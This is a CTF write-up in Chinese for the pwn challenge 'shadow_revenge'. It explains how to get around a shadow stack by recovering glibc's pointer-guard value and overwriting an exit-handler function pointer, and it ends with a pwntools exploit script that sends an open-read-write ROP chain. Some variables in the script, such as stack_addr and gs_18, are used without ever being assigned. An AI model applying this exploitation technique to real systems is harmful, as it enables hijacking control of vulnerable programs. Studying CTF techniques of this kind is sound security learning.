**PWN ｜ shadow\_revenge**

  

本题存在栈溢出漏洞, 利用漏洞可以实现任意地址写. 但是函数的返回地址和 save\_ebp 都被备份在了另一个栈上, 无法直接通过覆盖返回地址劫持控制流.

  

所以选手需要通过别的方式劫持控制流(malloc\_hook, realloc\_hook, free\_hook 等不行, 因为没有malloc/free).

我们先了解一下 exit\_function\_list 结构体. 相关定义如下

![](../Images/d94bf596eaed06974bfb004086f97e14.png)

  

而在libc中有个全局结构体实例 initial  

![](../Images/a34aedab74e4e5074a1c176c57355114.png)

  

我们在gdb里面也可以直接看到  

![](../Images/5082c3ac6ab0bbb72bf9df07907db347.png)

当程序调用exit的时候, exit中会调用 \_\_run\_exit\_handlers(status, &\_exit\_funcs, true), 而在该函数中会调用 initial结构体中的函数指针.

![](../Images/a4eb645b5473d76b4b7f6cf873ee7a3c.png)

  

所以如果我们可以利用任意地址写修改这个结构体, 就可以劫持控制流了. 但是这儿注意到实际调用函数指针之前对函数指针有个 PTR\_DEMANGLE的操作. 在 i386架构下这个宏是这么定义的:  

![](../Images/3973c7d4358a48a9629e996327255b0b.png)

调试可以发现汇编代码如下  

![](../Images/42aeddaf9670d51066f16a539df6c4cc.png)

  

而在 gs:\[0x18\]中存储的是一个随机数  

显然, 这儿的函数指针被加密了，所以，我们如果想要劫持控制流的话, 就得把目标函数地址进行编码之后替换掉原来的函数指针，因此，我们需要拿到 gs:\[0x18\]的值。 

  

方法就是利用initial中初始的函数指针。首先利用漏洞实现任意地址读写获取到原来的后的函数指针, 然后经过调试可以发现这个函数指针解码后指向的是 ld 中的 dl\_fini 函数。因此我们leak了 ld 的基地址之后就可以获得 dl\_fini 的地址, 结合 编码后的函数指针可以计算出 gs:\[0x18\] 的值。

  

而且通过源码可以看到这儿调用函数的时候第一个参数是可以控制的，所以我们可以先 leak 栈的地址, 然后调用 gets. 覆盖返回地址, 构造 orw 的 rop链, 从而拿到 flag。

  

总结一下exp利用流程大概如下

1.Leak canary

2.利用 .dynamic 中的 DEBUG 项 Leak ld.so 基地址, 计算出 dl\_fini 地址

3.Leak libc.基地址

4.利用 libc 中的 environ 变量 leak 栈地址

5.Leak initial 结构体中的 编码后的函数指针

6.通过编码后的函数指针和 dl\_fini 地址计算出 gs:\[0x18\]

7.用计算得到的 gs:\[0x18\] 编码 gets 的地址, 并替换原来的函数指针

8.修改第一个参数为栈地址. (调用gets 的时候可以覆盖到 返回地址即可)

9.调用exit, 触发 get(stack\_address)

10.输入 orw rop 链. 拿到flag

  

exp如下：

```

from pwn import \*
from time import sleep
import sys

global io

context(arch = 'i386', os = 'linux', endian = 'little')
context.log\_level = 'debug'
context.terminal = \['tmux', 'splitw', '-h'\]

port = 8888
if len(sys.argv) == 3:
    ip = sys.argv\[1\]
    port = int(sys.argv\[2\])

LOCAL = True if len(sys.argv)==1 else False

remote\_libc = "./libc.so.6\_r"
if LOCAL:

    io = process(filename, env\={'LD\_PRELOAD': remote\_libc})
    libc = ELF(remote\_libc)
else:
    context.log\_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote\_libc)

def lg(name, val):
    log.info(name+" : "+hex(val))

def rol(int\_value, k ,bit = 32):
    bit\_string = '{:0%db}' % bit
    bin\_value = bit\_string.format(int\_value) \# 8 bit binary
    bin\_value = bin\_value\[k:\] + bin\_value\[:k\]
    int\_value = int(bin\_value,2)
    return int\_value

def ror(int\_value, k ,bit = 32):
    bit\_string = '{:0%db}' % bit
    bin\_value = bit\_string.format(int\_value) \# 8 bit binary
    bin\_value = bin\_value\[\-k:\] + bin\_value\[:\-k\]
    int\_value = int(bin\_value,2)
    return int\_value

g\_stack\_base = 0x804B02C

\# leak canary
io.sendlineafter( "name :", 'pu1p')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", 'a'\*33)
io.recvuntil( 'a'\*33)
canary = u32('\\0'+io.recv( 3))
lg('canary', canary)

\# leak ld.so base
dynamic\_debug = 0x804AF28 + 4
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", flat('a'\*32, canary, '\\0'\*0x10, dynamic\_debug, 0x7fffff, 0x20))
io.recvuntil( "<")
ld\_base = u32(io.recv( 4)) \- 0x24904
lg("ld\_base", ld\_base)

\# leak libc base
''' got table
.got:0804AFCC printf\_ptr      dd offset printf        ; DATA XREF: \_printf↑r
.got:0804AFD0 puts\_ptr        dd offset puts          ; DATA XREF: \_puts↑r
.got:0804AFD4 strlen\_ptr      dd offset strlen        ; DATA XREF: \_strlen↑r  
'''
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \\
    flat('a'\*32, canary, '\\0'\*0x10, 0x0804AFCC, 0x10, 111))
io.recvuntil( "<")
printf\_addr = u32(io.recv( 4))
lg("printf\_addr", printf\_addr)
libc.address = printf\_addr \- libc.symbols\['printf'\]
puts\_addr = u32(io.recv( 4))
lg("puts\_addr", puts\_addr)
lg("libc base", libc.address)

\# leak stack address
environ\_addr = libc.symbols\['environ'\]
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \\
    flat('a'\*32, canary, '\\0'\*0x10, environ\_addr, 0x10, 0xffff))
io.recvuntil( "<")

lg("stack\_addr", stack\_addr)

initial\_addr = libc.address + 0x1b11e0
decoded\_func = ld\_base + 0xf880

lg("initial address", initial\_addr)
lg("decoded\_func", decoded\_func)

\# leak encoded function pointer, calc gs:\[0x18\]
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \\
    flat('a'\*32, canary, '\\0'\*0x10, initial\_addr+0xc, 0x10, 0xffff))

lg("gs\_18", gs\_18)

\# replace function pointer in initial
encoded\_gets\_addr = rol(libc.symbols\['gets'\] ^ gs\_18, 9)
open\_addr = libc.symbols\['open'\]
read\_addr = libc.symbols\['read'\]
write\_addr = libc.symbols\['write'\]

stack2 = stack\_addr \- 0x130

io.sendlineafter( "name :", flat(encoded\_gets\_addr, stack2, "/flag\\0"))
flag\_addr = initial\_addr + 0x14
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \\
    flat('a'\*32, canary, '\\0'\*0x10, initial\_addr+0xc, 0x10, 0))

\# orw rop
P2R = 0x0804899a
P3R = 0x0804890e
bss\_buf = 0x804b000+0x800
rop = flat(
    open\_addr, P2R, flag\_addr, 0,
    read\_addr, P3R, 3, bss\_buf, 0x100,
    write\_addr, P3R, 1, bss\_buf, 0x100,
)

sleep(1)
io.sendline( rop)

io.interactive()
```
